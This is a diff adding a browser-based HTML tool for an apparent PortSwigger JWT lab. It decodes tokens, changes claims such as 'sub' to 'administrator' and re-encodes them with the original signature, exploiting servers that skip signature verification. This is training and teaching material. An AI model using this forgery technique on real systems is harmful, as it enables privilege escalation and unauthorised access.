@@ -1,0 +1,453 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>JWT Security Lab Tool</title>
+  <style>
+    * {
+      box-sizing: border-box;
+    }
+
+    body {
+      font-family: 'Segoe UI', system-ui, sans-serif;
+      max-width: 1200px;
+      margin: 0 auto;
+      padding: 20px;
+      background: #1a1a2e;
+      color: #eee;
+      line-height: 1.6;
+    }
+
+    h1 {
+      color: #00d4ff;
+      border-bottom: 2px solid #00d4ff;
+      padding-bottom: 10px;
+    }
+
+    h2 {
+      color: #ff6b6b;
+      margin-top: 30px;
+    }
+
+    .section {
+      background: #16213e;
+      padding: 20px;
+      border-radius: 8px;
+      margin: 20px 0;
+    }
+
+    label {
+      display: block;
+      margin-bottom: 5px;
+      color: #00d4ff;
+      font-weight: bold;
+    }
+
+    textarea,
+    input[type="text"] {
+      width: 100%;
+      padding: 12px;
+      border: 1px solid #333;
+      border-radius: 6px;
+      background: #0f0f23;
+      color: #0f0;
+      font-family: 'Consolas', 'Monaco', monospace;
+      font-size: 14px;
+      resize: vertical;
+    }
+
+    textarea:focus,
+    input:focus {
+      outline: none;
+      border-color: #00d4ff;
+    }
+
+    button {
+      background: #00d4ff;
+      color: #1a1a2e;
+      border: none;
+      padding: 12px 24px;
+      border-radius: 6px;
+      cursor: pointer;
+      font-weight: bold;
+      font-size: 14px;
+      margin: 5px 5px 5px 0;
+      transition: all 0.2s;
+    }
+
+    button:hover {
+      background: #00a8cc;
+      transform: translateY(-1px);
+    }
+
+    button.secondary {
+      background: #4a4a6a;
+      color: #eee;
+    }
+
+    button.danger {
+      background: #ff6b6b;
+    }
+
+    .parts-grid {
+      display: grid;
+      grid-template-columns: 1fr 1fr 1fr;
+      gap: 15px;
+      margin-top: 15px;
+    }
+
+    @media (max-width: 800px) {
+      .parts-grid {
+        grid-template-columns: 1fr;
+      }
+    }
+
+    .part-box {
+      background: #0f0f23;
+      padding: 15px;
+      border-radius: 6px;
+      border: 1px solid #333;
+    }
+
+    .part-box h3 {
+      margin: 0 0 10px 0;
+      font-size: 14px;
+      text-transform: uppercase;
+    }
+
+    .part-box.header h3 {
+      color: #ff6b6b;
+    }
+
+    .part-box.payload h3 {
+      color: #c084fc;
+    }
+
+    .part-box.signature h3 {
+      color: #4ade80;
+    }
+
+    .part-box pre {
+      margin: 0;
+      white-space: pre-wrap;
+      word-break: break-all;
+      font-size: 13px;
+      color: #ddd;
+    }
+
+    .raw-value {
+      font-size: 11px;
+      color: #888;
+      margin-top: 10px;
+      padding-top: 10px;
+      border-top: 1px solid #333;
+      word-break: break-all;
+    }
+
+    .modify-section {
+      display: grid;
+      grid-template-columns: 1fr 1fr auto;
+      gap: 10px;
+      align-items: end;
+      margin: 15px 0;
+    }
+
+    .modify-section>div {
+      display: flex;
+      flex-direction: column;
+    }
+
+    .output-token {
+      background: #0f0f23;
+      padding: 15px;
+      border-radius: 6px;
+      font-family: monospace;
+      word-break: break-all;
+      border: 2px solid #4ade80;
+      margin-top: 15px;
+    }
+
+    .copy-btn {
+      background: #4ade80;
+      font-size: 12px;
+      padding: 6px 12px;
+    }
+
+    .info {
+      background: #00d4ff22;
+      border-left: 4px solid #00d4ff;
+      padding: 15px;
+      margin: 20px 0;
+      border-radius: 0 8px 8px 0;
+    }
+
+    code {
+      background: #0f0f23;
+      padding: 2px 6px;
+      border-radius: 4px;
+      font-family: monospace;
+    }
+
+    .link {
+      color: #4ade80;
+    }
+
+    .link:visited {
+      color: #4ade80;
+    }
+  </style>
+</head>
+
+<body>
+  <h1>🔐 JWT Security Lab Tool</h1>
+  <div class="section">
+    <strong style="color:#00d4ff;">Lab tutorial: </strong> <a class="link"
+      href="https://www.geeksforgeeks.org/web-tech/json-web-token-jwt/">https://www.geeksforgeeks.org/web-tech/json-web-token-jwt/</a>
+
+  </div>
+  <div class="section">
+    <h2>Browser tool</h2>
+    <strong style="color:#00d4ff;">Chrome: </strong> <a class="link"
+      href="https://chromewebstore.google.com/detail/simple-modify-headers/gjgiipmpldkpbdfjkgofildhapegmmic">https://chromewebstore.google.com/detail/simple-modify-headers/gjgiipmpldkpbdfjkgofildhapegmmic</a>
+    <br />
+    <strong style="color:#00d4ff;">Firefox: </strong> <a class="link"
+      href="https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/">https://addons.mozilla.org/en-US/firefox/addon/simple-modify-header/</a>
+
+  </div>
+
+  <div class="section">
+    <h2>1. Paste Your JWT Token</h2>
+    <label for="jwt-input">JWT Token:</label>
+    <textarea id="jwt-input" rows="4"
+      placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiIxMjM0NTY3ODkwIiwibmFtZSI6IkpvaG4gRG9lIiwiaWF0IjoxNTE2MjM5MDIyfQ.SflKxwRJSMeKKF2QT4fwpMeJf36POk6yJV_adQssw5c"></textarea>
+    <br><br>
+    <button onclick="decodeToken()">🔍 Decode Token</button>
+    <button class="secondary" onclick="loadExample()">Load Example</button>
+  </div>
+
+  <div class="section" id="decoded-section" style="display: none;">
+    <h2>2. Decoded Parts</h2>
+    <div class="parts-grid">
+      <div class="part-box header">
+        <h3>Header</h3>
+        <pre id="header-json"></pre>
+        <div class="raw-value">
+          <strong>Raw:</strong> <span id="header-raw"></span>
+        </div>
+      </div>
+      <div class="part-box payload">
+        <h3>Payload (Claims)</h3>
+        <pre id="payload-json"></pre>
+        <div class="raw-value">
+          <strong>Raw:</strong> <span id="payload-raw"></span>
+        </div>
+      </div>
+      <div class="part-box signature">
+        <h3>Signature</h3>
+        <pre id="signature-value"></pre>
+        <div class="raw-value" style="margin-top: 20px;">
+          <em>Note: We keep this unchanged when modifying the payload.
+            If the server doesn't verify signatures, it will still accept our modified token!</em>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <div class="section" id="modify-section" style="display: none;">
+    <h2>3. Modify a Claim (Attack Simulation)</h2>
+
+    <div class="info">
+      <strong>PortSwigger Lab Hint:</strong> Change the <code>sub</code> claim from
+      <code>wiener</code> to <code>administrator</code> to gain admin access!
+    </div>
+
+    <div class="modify-section">
+      <div>
+        <label for="claim-name">Claim Name:</label>
+        <input type="text" id="claim-name" placeholder="sub" value="sub">
+      </div>
+      <div>
+        <label for="claim-value">New Value:</label>
+        <input type="text" id="claim-value" placeholder="administrator">
+      </div>
+      <button class="danger" onclick="modifyClaim()">⚡ Modify Claim</button>
+    </div>
+
+    <h3>Modified Token:</h3>
+    <div class="output-token" id="modified-token">
+      <em>Click "Modify Claim" to generate...</em>
+    </div>
+    <button class="copy-btn" onclick="copyModifiedToken()">📋 Copy Token</button>
+  </div>
+
+  <div class="section">
+    <h2>4. Base64URL Encoder/Decoder</h2>
+    <div style="display: grid; grid-template-columns: 1fr 1fr; gap: 20px;">
+      <div>
+        <label for="encode-input">Plain Text → Base64URL:</label>
+        <textarea id="encode-input" rows="3" placeholder='{"alg":"HS256","typ":"JWT"}'></textarea>
+        <button onclick="encodeBase64Url()">Encode →</button>
+        <div class="output-token" id="encode-output" style="min-height: 50px; margin-top: 10px;"></div>
+      </div>
+      <div>
+        <label for="decode-input">Base64URL → Plain Text:</label>
+        <textarea id="decode-input" rows="3" placeholder="eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9"></textarea>
+        <button onclick="decodeBase64Url()">← Decode</button>
+        <div class="output-token" id="decode-output" style="min-height: 50px; margin-top: 10px;"></div>
+      </div>
+    </div>
+  </div>
+
+  <script>
+    // Base64URL Functions
+
+    function base64UrlEncode(str) {
+      const base64 = btoa(str);
+      return base64
+        .replace(/\+/g, '-')
+        .replace(/\//g, '_')
+        .replace(/=+$/, '');
+    }
+
+    function base64UrlDecode(base64Url) {
+      let base64 = base64Url
+        .replace(/-/g, '+')
+        .replace(/_/g, '/');
+
+      const padding = base64.length % 4;
+      if (padding) {
+        base64 += '='.repeat(4 - padding);
+      }
+
+      return atob(base64);
+    }
+
+    // JWT Functions
+
+    let currentDecoded = null;
+
+    function decodeToken() {
+      const token = document.getElementById('jwt-input').value.trim();
+
+      if (!token) {
+        alert('Please paste a JWT token first!');
+        return;
+      }
+
+      const parts = token.split('.');
+      if (parts.length !== 3) {
+        alert(`Invalid JWT: expected 3 parts separated by dots, got ${parts.length}`);
+        return;
+      }
+
+      try {
+        const header = JSON.parse(base64UrlDecode(parts[0]));
+        const payload = JSON.parse(base64UrlDecode(parts[1]));
+        const signature = parts[2];
+
+        currentDecoded = {
+          header,
+          payload,
+          signature,
+          raw: { header: parts[0], payload: parts[1], signature: parts[2] }
+        };
+
+        // Display decoded parts
+        document.getElementById('header-json').textContent = JSON.stringify(header, null, 2);
+        document.getElementById('header-raw').textContent = parts[0];
+
+        document.getElementById('payload-json').textContent = JSON.stringify(payload, null, 2);
+        document.getElementById('payload-raw').textContent = parts[1];
+
+        document.getElementById('signature-value').textContent = signature;
+
+        // Show sections
+        document.getElementById('decoded-section').style.display = 'block';
+        document.getElementById('modify-section').style.display = 'block';
+
+        // Pre-fill claim name if 'sub' exists
+        if (payload.sub) {
+          document.getElementById('claim-name').value = 'sub';
+          document.getElementById('claim-value').placeholder = payload.sub + ' → administrator';
+        }
+
+      } catch (error) {
+        alert('Failed to decode JWT: ' + error.message);
+      }
+    }
+
+    function modifyClaim() {
+      if (!currentDecoded) {
+        alert('Please decode a token first!');
+        return;
+      }
+
+      const claimName = document.getElementById('claim-name').value.trim();
+      const claimValue = document.getElementById('claim-value').value;
+
+      if (!claimName) {
+        alert('Please enter a claim name!');
+        return;
+      }
+
+      // Create modified payload
+      const newPayload = { ...currentDecoded.payload };
+      newPayload[claimName] = claimValue;
+
+      // Encode new parts
+      const newHeaderEncoded = base64UrlEncode(JSON.stringify(currentDecoded.header));
+      const newPayloadEncoded = base64UrlEncode(JSON.stringify(newPayload));
+
+      // Assemble new token (keeping original signature!)
+      const newToken = `${newHeaderEncoded}.${newPayloadEncoded}.${currentDecoded.signature}`;
+
+      document.getElementById('modified-token').textContent = newToken;
+    }
+
+    function copyModifiedToken() {
+      const token = document.getElementById('modified-token').textContent;
+      if (token && !token.includes('Click')) {
+        navigator.clipboard.writeText(token);
+        alert('Token copied to clipboard!');
+      }
+    }
+
+    function loadExample() {
+      const exampleJWT = 'eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJzdWIiOiJ3aWVuZXIiLCJuYW1lIjoiUGV0ZXIgV2llbmVyIiwiaWF0IjoxNTE2MjM5MDIyfQ.L8i6g3PfcHlioHCCPURC9pmXT7gdJpx3kOoyAfNUwCc';
+      document.getElementById('jwt-input').value = exampleJWT;
+      decodeToken();
+    }
+
+    // Base64URL Tool Functions
+
+    function encodeBase64Url() {
+      const input = document.getElementById('encode-input').value;
+      try {
+        const encoded = base64UrlEncode(input);
+        document.getElementById('encode-output').textContent = encoded;
+      } catch (error) {
+        document.getElementById('encode-output').textContent = 'Error: ' + error.message;
+      }
+    }
+
+    function decodeBase64Url() {
+      const input = document.getElementById('decode-input').value.trim();
+      try {
+        const decoded = base64UrlDecode(input);
+        // Try to pretty-print if it's JSON
+        try {
+          const json = JSON.parse(decoded);
+          document.getElementById('decode-output').textContent = JSON.stringify(json, null, 2);
+        } catch {
+          document.getElementById('decode-output').textContent = decoded;
+        }
+      } catch (error) {
+        document.getElementById('decode-output').textContent = 'Error: ' + error.message;
+      }
+    }
+  </script>
+</body>
+
+</html>
